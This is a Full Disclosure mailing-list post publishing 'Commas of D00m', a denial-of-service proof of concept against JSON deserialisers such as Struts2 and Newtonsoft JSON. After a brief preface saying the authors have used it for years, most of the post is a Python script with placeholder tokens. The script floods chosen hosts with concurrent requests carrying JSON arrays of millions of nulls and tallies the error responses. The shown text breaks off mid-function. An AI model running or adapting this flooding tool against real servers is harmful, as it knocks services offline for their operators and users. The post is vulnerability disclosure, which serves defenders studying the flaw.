---
title: JSON Deserialiser Unconstrained Resource Consumption Proof of	Concept
url: https://seclists.org/fulldisclosure/2026/Aug/117
source: Full Disclosure
date: 2026-08-30
fetch_date: 2026-08-31T07:53:51.466150
---

# JSON Deserialiser Unconstrained Resource Consumption Proof of	Concept

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](116)
[By Date](date.html#117)
[![Next](/images/right-icon-16x16.png)](118)

[![Previous](/images/left-icon-16x16.png)](116)
[By Thread](index.html#117)
[![Next](/images/right-icon-16x16.png)](118)

![](/shared/images/nst-icons.svg#search)

# JSON Deserialiser Unconstrained Resource Consumption Proof of Concept

---

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Sat, 29 Aug 2026 00:11:02 +0000

---

```
On 26 October 2025 we published "Struts2 and Related Framework Array/Collection DoS", which was followed up on 07 March
2026 by "JSON Deserialiser Unconstrained Resource Consumption Quick Overview".  Today we are publishing a proof of
concept that we have been using for more than 15 years against Struts2, Newtonsoft JSON, JSON.org, and various other
JSON parsers.  We are publishing, in part, because of the theft of our published materials by whitehats, the denial by
Apache, and because we want the community to see what insecure deserialisation really is, rather than the confused
ysoserial that targets insecure reflection (we previously published a write-up discussing insecure reflection and using
Inedo ProGet to demonstrate it - see our write-up on 26 April 2025 titled "Inedo ProGet Insecure Reflection and CSRF
Vulnerabilities").  We lovingly call this POC, "Commas of D00m".  Use find/replace on the tokens.  Enjoy

```python
#!/usr/bin/python3
# ---
# name: Collection-size overflow tester
# category: Testing and scanning
# tags: dos, payload, collection-size, json, flood, load, http
# description: Floods a host with concurrent oversized JSON payloads (a huge null array) to probe Java collection-size
limits.
# placeholders:
#   - token: "@@HOSTS@@"
#     field: hosts
#     kind: list
#     format: python
#     label: Hosts
#   - token: "@@CONTENT_TYPE@@"
#     field: content_type
#     kind: text
#     label: Content-Type
#     default: application/json
#   - token: "@@PATH@@"
#     field: path
#     kind: text
#     label: Request path
#     optional: true
#     default: /
#   - token: "@@HEADERS@@"
#     field: headers
#     kind: map
#     format: python
#     label: Extra headers, like the cookie and authorisation headers
#     optional: true
#   - token: "@@PARALLEL_COUNT@@"
#     field: parallel_count
#     kind: text
#     label: Parallel count (concurrent threads)
#     optional: true
#     default: 40
#   - token: "@@TOTAL_CONNECTIONS@@"
#     field: total_number_of_connections
#     kind: text
#     label: Total connections
#     optional: true
#     default: 1000
#   - token: "@@RECREATE_PAYLOAD@@"
#     field: recreate_payload
#     kind: text
#     label: Recreate payload file (true/false)
#     optional: true
#     default: true
#   - token: "@@PAYLOAD_FILE@@"
#     field: payload_file
#     kind: text
#     label: Payload file
#     optional: true
#     default: prebuilt_payload_tmp
#   - token: "@@PAYLOAD_LEFT@@"
#     field: payload_left
#     kind: text
#     label: Payload left (before the null array)
#     optional: true
#     default: {"serviceTypes": [
#   - token: "@@PAYLOAD_RIGHT@@"
#     field: payload_right
#     kind: text
#     label: Payload right (after the null array; blank uses the default)
#     optional: true
#   - token: "@@STEP@@"
#     field: step
#     kind: text
#     label: Step
#     optional: true
#     default: 1
#   - token: "@@MAX_COLLECTION_SIZE@@"
#     field: max_collection_size
#     kind: text
#     label: Max collection size
#     optional: true
#     default: 1048500
# ---
"""Flood a host with oversized JSON payloads to probe collection-size limits.

Builds a payload whose array holds a very large number of ``null`` entries --
enough to strain a server-side (Java) collection -- and fires it at each host
with a configurable amount of concurrency, tallying the status codes seen
(413s and 5xx especially) and logging any 5xx bodies to
``request-responses.txt``.  A Content-Type and at least one host are required.
Usage:
    python collection_size_overflow.py
"""

import concurrent.futures
import os
import random
import string
import time
from datetime import datetime, timezone

import requests

# REPLACE/ADJUST THESE
config = {
    'hosts': @@HOSTS@@,
    'paths': ['@@PATH@@' or '/'],
    'content_type': '@@CONTENT_TYPE@@',
    'extra_headers': @@HEADERS@@,
    'parallel_count': int('@@PARALLEL_COUNT@@' or 40),
    'total_number_of_connections': int('@@TOTAL_CONNECTIONS@@' or 1000),
    # Data for the payload generation
    'recreate_payload': ('@@RECREATE_PAYLOAD@@' or 'true').strip().lower() in ('1', 'true', 'yes'),
    'payload_file': '@@PAYLOAD_FILE@@' or 'prebuilt_payload_tmp',
    'payload_left': r"""@@PAYLOAD_LEFT@@""" or '{"serviceTypes": [',
    'payload_right': r"""@@PAYLOAD_RIGHT@@""" or '"IP_TUNNEL"]}',
    'step': int('@@STEP@@' or 1),
    'max_collection_size': int('@@MAX_COLLECTION_SIZE@@' or 1048500),
    # The maximum Java collection size is 2147483647; other sizes worth trying:
    # 0, 1, 1050000, 1350000, 2097000, 2097023, 2097102, 4500747, 14500747,
    # 67105747, 114500747
}

def count_status_codes(responses):
    """
    Walks through the responses and counts the status codes

    Args:
        responses (list[Response]): List of response objects

    Returns:
        dict: A dictionary with counts for each of the status codes that we monitor
    """
    try:
        with open('request-responses.txt', 'a') as f:
            for response in [r for r in responses if r is not None and 500 <= r.status_code < 600]:
                # Write response
                f.write("Response:\n")
                for header, value in response.headers.items():
                    f.write(f"{header}: {value}\n")
                f.write(f"{response.text}\n")

                # Add separator between entries
                f.write("-" * 50 + "\n")

        print(f"Successfully wrote responses to request-responses.txt")

    except Exception as e:
        print(f"Error writing to file: {str(e)}")

    counts = {
        '2xx': len([r for r in responses if r is not None and 200 <= r.status_code < 300]),
        '4xx': len([r for r in responses if r is not None and 400 <= r.status_code < 500]),
        '400': len([r for r in responses if r is not None and r.status_code == 400]),
        '402': len([r for r in responses if r is not None and r.status_code == 402]),
        '403': len([r for r in responses if r is not None and r.status_code == 403]),
        '404': len([r for r in responses if r is not None and r.status_code == 404]),
        '413': len([r for r in responses if r is not None and r.status_code == 413]),
        '429': len([r for r in responses if r is not None and r.status_code == 429]),
        '5xx': len([r for r in responses if r is not None and 500 <= r.status_code < 600]),
        '500': len([r for r in responses if r is not None and r.status_code == 500]),
        '502': len([r for r in responses if r is not None and r.status_code == 502]),
        '503': len([r for r in responses if r is not None and r.status_code == 503]),
        '504': len([r for r in responses if r is not None and r.status_code == 504])
    }
    for resp in responses:
        if resp is not None:
            if 500 <= resp.status_code < 600:
                print(f'{response.headers}')
            print(f'{resp.text}')
        else:
            print(f'We have a response of {resp}')
    return counts

def get_payload(recreate_payload=False):
    """
    Gr...